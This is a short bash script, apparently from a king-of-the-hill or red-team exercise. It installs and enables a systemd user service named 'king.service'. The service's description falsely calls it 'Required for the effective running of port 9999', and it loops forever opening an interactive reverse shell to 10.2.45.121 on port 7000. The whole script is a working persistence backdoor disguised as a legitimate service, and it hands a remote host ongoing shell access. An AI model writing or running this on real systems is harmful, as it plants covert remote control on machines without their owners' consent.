#!/bin/bash

echo -e "[Unit]
Description=Required for the effective running of port 9999

[Service]
Type=simple
ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/10.2.45.121/7000 0>&1; sleep 10; done\"

[Install]
WantedBy=multi-user.target
" > /home/$USER/.config/systemd/user/king.service

systemctl --user enable /home/$USER/.config/systemd/user/king.service
